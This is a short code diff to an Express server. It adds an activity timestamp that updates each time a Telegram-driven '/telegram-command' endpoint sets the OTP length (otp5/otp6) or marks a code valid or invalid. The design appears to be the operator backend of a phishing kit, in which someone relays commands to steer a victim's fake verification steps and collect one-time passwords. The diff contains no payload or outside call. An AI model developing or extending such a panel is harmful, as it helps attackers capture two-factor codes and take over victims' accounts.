@@ -7,6 +7,7 @@ const app = express();
 let otpLength = null;
 let step5Decision = null;   // for step 5 (otp5 / otp6)
 let step6Decision = null;   // for step 6 (valid / invalid)
+let lastActionTime = Date.now();
 
 app.use(express.json());
 
@@ -105,19 +106,23 @@ app.get("/telegram-command", (req, res) => {
   if (cmd === "otp5") {
   otpLength = 5;
   step5Decision = "otp5";
+  lastActionTime = Date.now();
 }
 
 if (cmd === "otp6") {
   otpLength = 6;
   step5Decision = "otp6";
+  lastActionTime = Date.now();
 }
 
 if (cmd === "valid") {
   step6Decision = "valid";
+  lastActionTime = Date.now();
 }
 
 if (cmd === "invalid") {
   step6Decision = "invalid";
+  lastActionTime = Date.now();
 }
 
   if (cmd === "reset") {
